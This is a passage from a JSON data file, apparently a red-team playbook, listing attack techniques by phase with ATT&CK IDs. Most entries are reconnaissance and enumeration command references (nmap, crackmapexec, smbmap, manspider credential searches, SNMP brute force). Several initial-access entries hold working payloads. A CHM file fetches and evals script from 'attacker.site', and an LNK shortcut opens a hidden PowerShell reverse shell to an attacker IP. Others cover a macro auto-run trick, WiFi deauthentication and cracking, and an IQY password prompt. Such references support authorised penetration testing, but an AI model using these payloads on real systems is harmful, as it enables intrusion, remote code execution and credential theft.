        "content": "Run the VBA module automatically as soon as the user enables macros.\n\n1. Insert the module you want and save the PowerPoint presentation as a macro supporting PowerPoint file type\n2. Unzip the PowerPoint file you saved\n3. Edit the _rels/.rels file to add the following line right before the last </ Relationships>.  \n`<Relationship Type=http://schemas.microsoft.com/office/2006/relationships/ui/extensibility Target=\u201c/customUI/customUI.xml\u201d Id=\u201dRd6e72c29d34a427e\u201d />`\n4. Create a new directory on the same level as the _rels directory called \u201ccustomUI\u201d.\n5. Inside customUI directory create a customUI.xml file containing the following.  \n`<customUI xmlns=http://schemas.microsoft.com/office/2006/01/customui onLoad=\u201dname of your VBA module\u201d ></customUI>`\n6. Zip the whole directory and rename it to the filename you used to save the original PowerPoint presentation\n\n\n\n## Tools\n########\n########",
        "category": "PowerPoint",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "4b0592f0-8e38-4a9e-86a4-4289ff827885",
        "name": "WiFi crack",
        "phase": "01. Initial Access",
        "ttp": "T0000",
        "external": true,
        "description": "Try to crack the WiFi in order to gain access to the internal network remotely",
        "content": "## Tools\n########\n########",
        "category": "Physical",
        "stealthy": false,
        "changes": [
            "\n## [[aircrack-ng]]\n```java\n//Set wificard in monitor mode (monitor.sh)\nIfconfig\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 --> take wlan card name\nIfconfig name down\u00a0\u00a0\u00a0\u00a0 //runterfahren\nIfconfig name mode monitor\nIfconfig name up\nIwconfig name | grep Mode\n\n//Change MAC\n\n\n//Check if prozess interfering! IF KILL\nAirmon-ng check name\nKill 1312 (Networkmanager)\nKill\u00a017917 (dhclient)\nKill 1556, 1215, 1216\n\n//Netzwerk sniffen\nAirodump-ng name\nAirodumo -c [channel] -w [FILE] --bsssid [MAC]\nAirplay-ng -0 0 -a [MAC]              //deauthenticate dauerhaft\nAircrack-ng -w [word list] capture.cap\n\n//Change networkcard channel to Router channel\nAireplay-ng -0 0 -a [MAC] name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 --> get channel + MAC(bssid)\nIwconfig name channel 6\n```"
        ],
        "tools": [
            "aircrack-ng"
        ],
        "steps": []
    },
    {
        "id": "98e8b34c-4b74-425f-a69e-34731f9268a4",
        "name": "CHM",
        "phase": "01. Initial Access",
        "ttp": "T1218.001",
        "external": true,
        "description": "CHM file containing a custom JavaScript backdoor",
        "content": "# CHM files with JS\nMicrosoft Compiled HTML Help (CHM) is a Microsoft online help format, consisting of a collection of HTML pages and navigation tools, compressed in a binary format with the extension CHM. When programmically downloaded CHM files do not have to be \"unblocked\" to be executed.\n\n[blogpost](https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/)\n\nHTML file which needs to be added to the CHM file\n```html\n<!DOCTYPE html><html><head><title>Click Me</title><head></head><body>\nPoC ! <br>\n<OBJECT id=x classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\" width=1 height=1>\n<PARAM name=\"Command\" value=\"ShortCut\">\n<PARAM name=\"Button\" value=\"Bitmap::shortcut\">\n<PARAM name=\"Item1\" value=',rundll32.exe,javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://attacker.site/connect\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}'>\n<PARAM name=\"Item2\" value=\"273,1,1\">\n</OBJECT>\n<SCRIPT>\nx.Click();\n</SCRIPT>\n</body></html>\n```\n\nThe CHM files can be automatically create via [creating Compiled HTML Help file](https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1)\n\n\n## Tools\n########\n########",
        "category": "Uncommon Extensions",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "cb0837ac-4fa4-49ae-b07a-5cb94060b08a",
        "name": "HTA",
        "phase": "01. Initial Access",
        "ttp": "T1218.005",
        "external": true,
        "description": "HTA executing JS or VBScript",
        "content": "# HTA\nAn HTA is a proprietary Windows program whose source code consists of HTML and one or more scripting languages supported by Internet Explorer (VBScript and JScript).\nAn HTA executes without the constraints of the browser's security model, so it executes as a \"fully trusted\" application.\nAn HTA is executed using `mshta.exe`, which is typically installed along with IE. In fact, `mshta` is dependent on IE, so if it has been uninstalled, HTAs will be unable to execute.\n\nBy default x32 version will be called\nCannot be send via Email. Use second stage (link,zip,iso) delivery method.\n\n\n## Tools\n########\n########",
        "category": "Uncommon Extensions",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "3ee71eb9-466f-4165-9545-78720271c26d",
        "name": "IQY",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "IQY (Web Query) Excel files",
        "content": "# IQY\nWeb Query (IQC) files are associated with Microsoft Excel.\nWeb queries allow you to query data from a specific World Wide Web, Internet, or intranet site and retrieve the information directly into a Microsoft Excel worksheet\n\n## Sample\n```text\nWEB 1 http://SERVER/[\"a\",\"Please Enter Your Password\"]\n```\n\n## References\n[source](http://www.labofapenetrationtester.com/2015/08/abusing-web-query-iqy-files.html)\n\n## Tools\n########\n########",
        "category": "Uncommon Extensions",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "f5f9de12-9647-4782-8a56-51c8e90be3ee",
        "name": "LNK",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "LNK (Shell Link file) remotly/localy executing code",
        "content": "# LNK\nAccording to Microsoft\u2019s documentation on [MS-SHLLINK]: Shell Link (.LNK) Binary File Format, in this format a structure is called a shell link, or shortcut, and is a data object that contains information that can be used to access another data object.\nWe can craft LNK files that reference useful target files such as cmd.exe or PowerShell. There is a restriction for 260 symbols in summary for LNK files when standard Windows properties form is used.\n\nA relatively stealthy social engineering attack would be sending a crafted LNK file embedded as an OLE object in a Word Document.\n\n## Create LNK file\nWith rev-shell via tcp\n\n```powershell\n$WshShell = New-Object -comObject WScript.Shell\n$Shortcut = $WshShell.CreateShortcut(\"c:\\lnk_tests\\payload.lnk\")\n$Shortcut.TargetPath = \"%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe\"\n$Shortcut.IconLocation = \"%SystemRoot%\\System32\\Shell32.dll,21\"\n$Shortcut.Arguments = '-windowstyle hidden /c $sm=(New-Object Net.Sockets.TCPClient(\"attacker IP\",55555)).GetStream();[byte[]]$bt=0..255|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} '\n$Shortcut.Save()\n```\n\n## Tools\n########\n########",
        "category": "Uncommon Extensions",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "f5c6e064-3895-42ae-a617-90f735f87514",
        "name": "MSG",
        "phase": "01. Initial Access",
        "ttp": "T1204.002",
        "external": true,
        "description": "MSG (email) file containing emails with embedded attachements",
        "content": "# MSG\nMSG file is a file format for storing Microsoft Outlook and Exchange message files. There have been attacks that leveraged this extension combined with embedded OLE objects to bypass corporate email defenses.\n[source 1](https://medium.com/@networksecurity/oleoutlook-bypass-almost-every-corporate-security-control-with-a-point-n-click-gui-37f4cbc107d0)\n[source 2](https://www.trustwave.com/Resources/SpiderLabs-Blog/Down-the-Rabbit-Hole--Extracting-Maliciousness-from-MSG-Files-Without-Outlook/)\n\n\n## Tools\n########\n########",
        "category": "Uncommon Extensions",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "2ec8cae8-6273-4ad7-93e6-777648bf477b",
        "name": "Active Reconnaissance",
        "phase": "02. Reconnaissance",
        "ttp": "T1595",
        "external": true,
        "description": "Probing infrastructure and people , banner grabbing, web bugs.",
        "content": "# Active Reconnaissance\nIts alternative is the [[Passive Reconnaissance]]\n\n\ntools\n* o365: autodiscover.mdsec.co.uk/autodiscover/autodiscover.xml\n* email security: [spoofcheck](https://github.com/BishopFox/spoofcheck)\n* username: [namemash](https://gist.github.com/superkojiman/11076951), [[Cewl]]\n* scanning: [[EyeWitness]], [[MASSCAN]], [[MFAsweep]]\n* password spraying: [[LyncSniper]], [[MailSniper]], [[ruler]], [[SprayingToolkit]]\n* spear phishing: lambda web bugs, [[Responder]]\n  \nInformation you can use for [[Phishing]]\n* use id for spear phishing\n* take a look at the useragent\n* referer\n* domain, computer\n  \npreperation\n* OS (amsi?)\n* x32/x64 - shellcode/injection\n* version .net framework, DotNet2JS?\n* Microsoft Office 2016 - OLE, Protected View\n\n## Tools\n########\n########",
        "category": "External Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [],
        "steps": []
    },
    {
        "id": "14f62892-4701-4be0-aca8-d2ca3b2f2f0d",
        "name": "Exposed Machines",
        "phase": "02. Reconnaissance",
        "ttp": "T1595",
        "external": true,
        "description": "Identify services within the network",
        "content": "# Exposed Machines \n\n\n\nUse [[NMAP]] and [[Nessus]] in order to detect the following exposed machines\n\n* Database Server\n* Email Server\n* SSH Server\n* VPN Server\n* Web Server\n\n\n## Tools\n########\n########",
        "category": "External Reconnaissance",
        "stealthy": false,
        "changes": [
            "\n## [[Amass]]\nScan for external machines",
            "\n## [[LyncSniper]]\n",
            "\n## [[NMAP]]\n[[Domain Computers]]\n* Ping Scan  \n> nmap -sP -p <ip>\n* Search smb vuln  \n> nmap -PN --script smb-vuln* -p139,445 <ip>\n* Classic Scan  \n> nmap -PN -sC -sV <ip>\n* Full Scan  \n>nmap -PN -sC -sV -p- <ip>\n* UDP Scan  \n>nmap -sU -sC -sV <ip>"
        ],
        "tools": [
            "Amass",
            "LyncSniper",
            "NMAP"
        ],
        "steps": []
    },
    {
        "id": "fc9f5e77-ac7e-4792-b3be-793699cd8a81",
        "name": "Leaked Files",
        "phase": "02. Reconnaissance",
        "ttp": "T1597",
        "external": true,
        "description": "Identify files on the internet which can be used for information gathering and for metadata analysis",
        "content": "## Tools\n########\n########",
        "category": "External Reconnaissance",
        "stealthy": false,
        "changes": [
            "\n## [[Metagoofil]]\n[[Metadata]]"
        ],
        "tools": [
            "Metagoofil"
        ],
        "steps": []
    },
    {
        "id": "6cb8f07d-7217-45fd-a91a-d0db966d78b4",
        "name": "Metadata",
        "phase": "02. Reconnaissance",
        "ttp": "T1594",
        "external": true,
        "description": "Identify metadata within files in order to identify usernames, IPs etc.",
        "content": "## Tools\n########\n########",
        "category": "External Reconnaissance",
        "stealthy": false,
        "changes": [
            "\n## [[FOCA]]\nDownload [here](https://github.com/ElevenPaths/FOCA/releases)"
        ],
        "tools": [
            "FOCA",
            "Metagoofil"
        ],
        "steps": []
    },
    {
        "id": "dc347925-82ac-4fb4-8e76-3e05ef81059f",
        "name": "Passive Reconnaissance",
        "phase": "02. Reconnaissance",
        "ttp": "T1592",
        "external": true,
        "description": "Identify publicly available services",
        "content": "# Passive Reconnaissance\nIts alternative is the [[Active Reconnaissance]]\n\nNot directly interacting with the target its infrastrucutre or people\n* domain, hostnames, dns records\n```\ndig evil.corp +short\nwhois 104.21.1.132\n```\n* subnets, address ranges and IPs\n* exposed web applications and logon portals\n* employee social media\n```\nsite:\"linkedin.com\" \"<company name>\"\n```\n* employee e-mail addresses\n* credentials in public breaches\n* publicly available documents\n* job / skill descriptions (which EDR / AV etc.)\n  \nTools\n* general: [[Spiderfoot]], [[recon-ng]]\n* dns: [[Amass]], [[dnsrecon]], [[sublist3r]], [dnscan](https://github.com/rbsec/dnscan)\n* subnet: [ipv4info](http://ipv4info.com/), [shodan](https://www.shodan.corp/), [whois](https://who.is/), [censys](https://search.censys.corp/), [dnsdumpster](https://dnsdumpster.com/) (in sublist3r)\n* people: [[linedInt]], [[theHarvester]], [[Prowl]], [[Raven]], [hunter.corp](https://hunter.corp/)\n* credentials: [haveIBeenPwned](https://haveibeenpwned.com/), public breaches\n* metadata: [[FOCA]], [[Metagoofil]]\n\n\n## Tools\n########\n########",
        "category": "External Reconnaissance",
        "stealthy": false,
        "changes": [
            "\n## [[Collector]]\nhttps://github.com/thewhiteh4t/FinalRecon",
            "\n## [[FinalRecon]]\n```sh\npython3 finalrecon.py -h\nusage: finalrecon.py [-h] [--headers] [--sslinfo] [--whois] [--crawl] [--full]\n                     url\n\nFinalRecon - OSINT Tool for All-In-One Web Recon | v1.0.0\n\npositional arguments:\n  url         Target URL\n\noptional arguments:\n  -h, --help  show this help message and exit\n  --headers   Get Header Information\n  --sslinfo   Get SSL Certificate Information\n  --whois     Get Whois Lookup\n  --crawl     Crawl Target Website\n  --full      Get Full Analysis, Test All Available Options\n\n# Check headers\npython3 finalrecon.py --headers <url>\n\n# Check ssl Certificate\npython3 finalrecon.py --sslinfo <url>\n\n# Check whois Information\npython3 finalrecon.py --whois <url>\n\n# Crawl Target\npython3 finalrecon.py --crawl <url>\n\n# full scan\npython3 finalrecon.py --full <url>\n```",
            "\n## [[recon-ng]]\n",
            "\n## [[Spiderfoot]]\n"
        ],
        "tools": [
            "Collector",
            "FinalRecon",
            "recon-ng",
            "Spiderfoot"
        ],
        "steps": []
    },
    {
        "id": "be1c0f32-c79b-40f8-ad56-05fb7dd1cfad",
        "name": "Contact details",
        "phase": "02. Reconnaissance",
        "ttp": "T1589",
        "external": true,
        "description": "Identify employees contact details",
        "content": "## Tools\n########\n########",
        "category": "Employee",
        "stealthy": false,
        "changes": [
            "\n## [[Prowl]]\n",
            "\n## [[theHarvester]]\n[[IPs/Domains]] [[IP Ranges]]"
        ],
        "tools": [
            "Prowl",
            "theHarvester"
        ],
        "steps": []
    },
    {
        "id": "3d01c8aa-e4eb-4d8f-961b-03b66cd682c7",
        "name": "LinkedIn",
        "phase": "02. Reconnaissance",
        "ttp": "T1593.001",
        "external": true,
        "description": "Identify employees based on LinkedIn",
        "content": "## Tools\n########\n########",
        "category": "Employee",
        "stealthy": false,
        "changes": [
            "\n## [[linedInt]]\n",
            "\n## [[Raven]]\n"
        ],
        "tools": [
            "linedInt",
            "Raven"
        ],
        "steps": []
    },
    {
        "id": "13ce4a1a-f645-4f6d-b168-9009237e4dbb",
        "name": "Certificates",
        "phase": "02. Reconnaissance",
        "ttp": "T1596.003",
        "external": true,
        "description": "Identify services and URLs through certificates",
        "content": "# Certificates\n\n## Tools\n########\n########",
        "category": "IPs",
        "stealthy": false,
        "changes": [],
        "tools": [
            "ForgeCert"
        ],
        "steps": []
    },
    {
        "id": "27de647c-9ac7-4e12-87dc-f0ff814a20f6",
        "name": "DNS",
        "phase": "02. Reconnaissance",
        "ttp": "T1596.001",
        "external": true,
        "description": "Identify services and URLs through DNS",
        "content": "# DNS\n\n## Tools\n########\n########",
        "category": "IPs",
        "stealthy": false,
        "changes": [
            "\n## [[dnsrecon]]\nEnumerate DNS"
        ],
        "tools": [
            "dnsrecon"
        ],
        "steps": []
    },
    {
        "id": "1644e4bf-c05d-42d9-865b-98411ded47e5",
        "name": "Domains",
        "phase": "02. Reconnaissance",
        "ttp": "T1596.002",
        "external": true,
        "description": "Identify services and URLs Domains",
        "content": "# Domains\n\n## Tools\n########\n########",
        "category": "IPs",
        "stealthy": false,
        "changes": [],
        "tools": [
            "sublist3r",
            "theHarvester"
        ],
        "steps": []
    },
    {
        "id": "c37c32a4-4c76-4f17-8556-733f44c02629",
        "name": "IP Ranges",
        "phase": "02. Reconnaissance",
        "ttp": "T1596.002",
        "external": true,
        "description": "Identify services and URLs through IP-Ranges",
        "content": "# IP Ranges\n\n## Tools\n########\n########",
        "category": "IPs",
        "stealthy": false,
        "changes": [
            "\n## [[MASSCAN]]\n"
        ],
        "tools": [
            "MASSCAN",
            "theHarvester"
        ],
        "steps": []
    },
    {
        "id": "6984151a-bbdb-43a5-a33f-47743b1352ce",
        "name": "Credentials",
        "phase": "02. Reconnaissance",
        "ttp": "T1087",
        "external": false,
        "description": "Find credentials within knowledge bases or shares",
        "content": "",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [
            "\n## [[MANSPIDER]]\nSearch the network for filenames that may contain creds\n>manspider 192.168.0.0/24 -f passw user admin account network login logon cred -d evilcorp -u admin -p password\n\nSearch for XLSX files containing \"password\"\n>manspider share.evil.corp -c password -e xlsx -d evilcorp -u admin -p password\n\nSearch for interesting file extensions\n> manspider share.evil.corp -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config -d evilcorp -u admin -p password"
        ],
        "tools": [
            "Bettercap",
            "Ettercap",
            "Hashcat",
            "John the Ripper",
            "ldapsearch",
            "MANSPIDER",
            "Mimikatz",
            "sslstrip"
        ],
        "steps": [
            {
                "id": "ebdbadf0-e284-4e4b-8a66-59f3847f231e",
                "name": "Find files containing credentials",
                "description": "",
                "requirements": {
                    "and": [
                        {
                            "or": [
                                {
                                    "tag": "CRED:TICKET"
                                },
                                {
                                    "and": [
                                        {
                                            "tag": "CRED:USERNAME:NAME"
                                        },
                                        {
                                            "tag": "CRED:PASS:PLAIN"
                                        },
                                        {
                                            "tag": "AUTHN:DOMAIN"
                                        }
                                    ]
                                }
                            ]
                        },
                        {
                            "tag": "SERVICE:LDAP"
                        }
                    ]
                },
                "results": [
                    "CRED:PASS",
                    "CRED:USERNAME"
                ]
            }
        ]
    },
    {
        "id": "fc9c6492-13d1-42e0-b483-055a76a7c6a1",
        "name": "Find Mail Server",
        "phase": "02. Reconnaissance",
        "ttp": "T1595.001",
        "external": false,
        "description": "Find mail server within a network",
        "content": "# Tools\n########\n\n########",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [
            "\n## [[Nslookup]]\nFind exchange server via nslookup  \n`nslookup -q=MX <domain>`\n`nslookup _tcp._autodiscover.domain.com`  \n`nslookup autodiscover.domain.com`  \n`nslookup mail.domain.com`  \n`nslookup email.domain.com`  \n`nslookup owa.domain.com`  \n`nslookup securemail.domain.com`",
            "\n## [[ruler]]\n[[Phishing]] [[Internal Phishing]]"
        ],
        "tools": [
            "Nslookup",
            "ruler"
        ],
        "steps": []
    },
    {
        "id": "215975da-84ae-4b96-bab6-4a9d0b027878",
        "name": "Find Web Server",
        "phase": "02. Reconnaissance",
        "ttp": "T1595.001",
        "external": false,
        "description": "Find web server within a network",
        "content": "# Tools\n########\n\n########",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [
            "\n## [[EyeWitness]]\nLocal Scan (does not work)\n>./EyeWitness.py --localscan 192.168.1.0/24\n\nScan with multiple IPs received from NMAP\n```sh\ncat /root/targets.txt\n10.10.17.71\n10.10.1.20\n10.10.17.68\n\nproxychains4 ./EyeWitness.py --web -f /root/targets.txt -d /root/edu --no-dns --no-prompt\n\nStarting Web Requests (3 Hosts)\nAttempting to screenshot http://10.10.17.71\n[*] WebDriverError when connecting to http://10.10.17.71\nAttempting to screenshot http://10.10.1.20\n[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.1.20:80  ...  OK\nAttempting to screenshot http://10.10.17.68\n[*] WebDriverError when connecting to http://10.10.17.68\nFinished in 12.967030048370361 seconds\n```",
            "\n## [[GoWitness]]\nScan internal network\n* Screenshot a single website  \n> gowitness single https://www.google.com/\n* Screenshot a cidr using 20 threads  \n> gowitness scan --cidr 192.168.0.0/24 --threads 20\n* Scan based on Nessus scan\n> .\\gowitness-2.4.0-windows-amd64.exe nessus -f .\\ScanniSceneroni_xm6g2a.nessus\n* Scan based on URL/IP file\n> .\\gowitness-2.4.0-windows-amd64.exe file -f '.\\External Pentesting\\urls.txt'\n* Screenshot open http services from an namp file  \n> gowitness nmap -f nmap.xml --open --service-contains http\n* Run the report server  \n> gowitness report serve"
        ],
        "tools": [
            "EyeWitness",
            "GoWitness"
        ],
        "steps": []
    },
    {
        "id": "1fa59a9a-65a1-42bc-ae2f-ba08dbac3488",
        "name": "Guest Access (SMB)",
        "phase": "02. Reconnaissance",
        "ttp": "T1595.001",
        "external": false,
        "description": "Find SMB with guest access enabled",
        "content": "# Find guest access (SMB)\n\n## Tools\n########\n########",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [
            "\n## [[crackmapexec]]\nEnumerate null sessions\n>cme smb <ip> -u '' -p ''  \n\nEnumerate Anonymous access\n>cme smb <ip> -u 'a' -p ''",
            "\n## [[enum4linux]]\n> enum4linux -a -u \"\" -p \"\" <dc-ip>  \n> enum4linux -a -z \"guest\" -o \" <dc-ip>",
            "\n## [[smbclient]]\n[[Shares]]\n* `smbclient -U '%' -L //<dc-ip>`\n* `smbclient -U 'guest%' -L //<dc-ip>`",
            "\n## [[smbmap]]\n* `smbmap -u \"\" -p \"\" -P 445 -H <dc-ip>`\n* `smbmap -u \"guest\" -p \"\" -P 445 -H <dc-ip>`"
        ],
        "tools": [
            "crackmapexec",
            "enum4linux",
            "smbclient",
            "smbmap"
        ],
        "steps": []
    },
    {
        "id": "56591923-a935-4f2f-8f79-ae33f8cb50df",
        "name": "OT Devices",
        "phase": "02. Reconnaissance",
        "ttp": "T1595.001",
        "external": false,
        "description": "Identify common OT devices",
        "content": "## Tools\n########\n########",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [
            "\n## [[NMAP]]\n> .\\nmap.exe -p- --script=s7-info,modbus-discover,bacnet-info,enip-info,Siemens-CommunicationsProcessor.nse,Siemens-HMI-miniweb.nse,Siemens-Scalance-module.nse,Siemens-SIMATIC-PLC-S7.nse,Siemens-WINCC.nse 172.29.137.100"
        ],
        "tools": [
            "NMAP"
        ],
        "steps": []
    },
    {
        "id": "340acfa4-5d20-4539-ab58-b1548a3b108a",
        "name": "Shares",
        "phase": "02. Reconnaissance",
        "ttp": "T1083",
        "external": false,
        "description": "Identify hosts with smb running on the network",
        "content": "",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [
            "\n## [[crackmapexec]]\n* Enumerate smb hosts  \n>cme smb <ip_range>",
            "\n## [[mmc]]\n[[Logged In Users]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Shared Folders",
            "\n## [[PowerView]]\n### Identify Shares\n\n`Find-DomainShare` will find SMB shares in a domain and `-CheckShareAccess` will only display those that the executing principal has access to. via [[PowerView]]\n\n```powershell\nFind-DomainShare -CheckShareAccess\n\nName           Type Remark              ComputerName\n----           ---- ------              ------------\nsoftware          0                     dc-2.edu.evil.corp\n```"
        ],
        "tools": [
            "crackmapexec",
            "mmc",
            "PowerView",
            "smbclient"
        ],
        "steps": []
    },
    {
        "id": "3149289a-f245-40a0-8612-0433b0f41781",
        "name": "SMB Signing",
        "phase": "02. Reconnaissance",
        "ttp": "T1000",
        "external": false,
        "description": "Is SMB signing enabled",
        "content": "# SMB Signing\n\n## Metasploit\n* `use exploit/windows/smb/smb_relay`\n\n## Tools\n########\n########",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [
            "\n## [[crackmapexec]]\nChecking for SMB signing",
            "\n## [[NMAP]]\n> nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK"
        ],
        "tools": [
            "crackmapexec",
            "NMAP"
        ],
        "steps": []
    },
    {
        "id": "b316363c-92cc-43ab-a78d-54d1971c3746",
        "name": "User enum",
        "phase": "02. Reconnaissance",
        "ttp": "T1087",
        "external": false,
        "description": "Find users",
        "content": "",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [
            "\n## [[crackmapexec]]\n>cme smb <ip> -u <user> -p '<password>' --users",
            "\n## [[enum4linux]]\n> enum4linux -U <dc-ip> | grep 'user:'",
            "\n## [[ldapsearch]]\n> ldapsearch -x -h <ip> -s base",
            "\n## [[NMAP]]\n> nmap -n -sV --script \"ldap* an not brute\" -p 389 <dc-ip>",
            "\n## [[rpcclient]]\nEnumerate users present on a system\n```\nproxychains rpcclient 10.0.1.10 -U testuser -P pw\nenumdomusers\n```\n\nEnumerate the user\n`queryuser testuser`\n\n\nEnumerate the current users privs\n`enumprivs`"
        ],
        "tools": [
            "crackmapexec",
            "enum4linux",
            "ldapsearch",
            "NMAP",
            "rpcclient"
        ],
        "steps": []
    },
    {
        "id": "72938e82-6c59-4cc9-bad0-96609d5f5362",
        "name": "Identify Machines",
        "phase": "02. Reconnaissance",
        "ttp": "T1595.001",
        "external": false,
        "description": "Identify services within the network",
        "content": "# Exposed Machines \n\nUse [[NMAP]] in order to detect the following services\n\n* Database Server\n* Email Server\n* SSH Server\n* VPN Server\n* Web Server\n\n## Tools\n########\n########",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [
            "\n## [[nbtscan]]\nScans the whole 192.168.1.0/24 network:\n> nbtscan -r 192.168.1.0/24\nScans a range from 192.168.1.25 to 192.168.1.137:\n> nbtscan 192.168.1.25-137\nScans C-class network. Prints results in script-friendly format using colon as field separator:\n> nbtscan -v -s : 192.168.1.0/24\nScans the whole 192.168.1.0/24 subnet, list all names received from each host (-v), print human-readable service names (-h):\n> nbtscan -h -v 192.168.1.0/24",
            "\n## [[PowerUpSQL]]\n## Discovery\n- `Get-SQLInstanceDomain`\n  Searching for SPNs that begin with `MSSQL*`\n- `Get-SQLInstanceBroadcast` \n- `Get-SQLInstanceScanUDP`\n- [[BloodHound#Database Server]]\n\n```ps\nGet-SQLInstanceDomain\n\nComputerName     : srv1.edu.evil.corp\nInstance         : srv1.edu.evil.corp,1433\nDomainAccountSid : 150000[ ...snip... ]172110400\nDomainAccount    : svc_mssql\nDomainAccountCn  : MS SQL Service\nService          : MSSQLSvc\nSpn              : MSSQLSvc/srv1.edu.evil.corp:1433\nLastLogon        : 5/14/2022 2:24 PM\nDescription      :\n```\n\n## Auto information gathering\n```ps\nGet-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLServerInfo\n```\n\n## Test Login\n```ps\nGet-SQLConnectionTest -Instance \"srv1.edu.evil.corp,1433\" | fl\n\nComputerName : srv1.edu.evil.corp\nInstance     : srv1.edu.evil.corp,1433\nStatus       : Accessible\n```\n\n## Gather information\n```ps\nGet-SQLServerInfo -Instance \"srv1.edu.evil.corp,1433\"\n\nComputerName           : srv1.edu.evil.corp\nInstance               : SRV1\nDomainName             : EDU\nServiceProcessID       : 3960\nServiceName            : MSSQLSERVER\nServiceAccount         : EDU\\svc_mssql\nAuthenticationMode     : Windows Authentication\nForcedEncryption       : 0\nClustered              : No\nSQLServerVersionNumber : 13.0.5026.0\nSQLServerMajorVersion  : 2019\nSQLServerEdition       : Standard Edition (64-bit)\nSQLServerServicePack   : SP2\nOSArchitecture         : X64\nOsMachineType          : ServerNT\nOSVersionName          : Windows Server 2016 Datacenter\nOsVersionNumber        : SQL\nCurrentlogin           : EDU\\john\nIsSysadmin             : Yes\nActiveSessions         : 1\n```\n\n## SQL Query\n```ps\nGet-SQLQuery -Instance \"srv1.edu.evil.corp,1433\" -Query \"select @@servername\"\n\nColumn1\n-------\nSRV1\n```",
            "\n## [[snmpwalk]]\nUses snmp-getnext requests to enumerate a network device for their tree information. An object identified (OID) can be provided and from there all information below will be queried. If no OID is being provided, snmpwalk will start at the subtree rooted at SNMPv2-SMI::mib-2.\n\n![](/Images/Tools/d2e354a3-b1dc-40fa-bb6f-323dea9713de.png)\n\nIf the OID is being displayed as follows\n\n![](/Images/Tools/549ed8bc-0f8d-4d5a-89b0-df8cbff60ca3.png)\n\nensure to install the _snmp-mibs-downloader_ and commend the 4th line in /etc/snmp/snmp.conf.\n\nExample to query installed programs:\n\n![](/Images/Tools/0de1da34-6198-4529-90d3-40d89d6bccbd.png)\n\nsnmpset - modify\n----------------\n\nSNMPset is using the _set_ request to set or change information on the network entity. It allows managing the device.\n\nThe minimum requirement for this tool is a valid _OID_, a _type_ (integer, string), and a _value_. The following command changed the _sysContact_ key.\n\n![](/Images/Tools/31682251-2c70-48eb-9587-abadd7f63da0.png)\n![](/Images/Tools/8af26abc-4c3d-4ee2-9349-0895906829d6.png)\n\nAll available types are listed below:\n\n![](/Images/Tools/a9790eba-1da7-4a28-b942-3083cc4e36d7.png)\n\nYou can find NMAP scripts for SNMP as follows:\n\n```bash\nls /usr/share/nmap/scripts | grep -i snmp\n```\n\nThe above-mentioned process enumeration can also be done with the following NMAP script\n\n```java\nsudo nmap -sU -p 161 --scripts=snmp-win32-services 192.168.1.1\n```\n\nCommunity string bruteforce\n\n```bash\nsudo apt install seclists\nsudo nmap -sU -p 161 --scripts=snmp-brute --script-args=snmp.brute.communitiesdb=/usr/share/seclists/Misc/wordlist-common-snmp-community-strings.txt 192.168.1.1\n```"
        ],
        "tools": [
            "nbtscan",
            "PowerUpSQL",
            "snmpwalk"
        ],
        "steps": []
    },
    {
        "id": "20d2d952-3da5-4ad9-ab3d-273e2ffbd3e4",
        "name": "Bookmarks-History",
        "phase": "03. Host Enumeration",
        "ttp": "T1005",
        "external": false,
        "description": "Gather information about internal knowledgebases or target systems by reading the browsers history and bookmarks.",
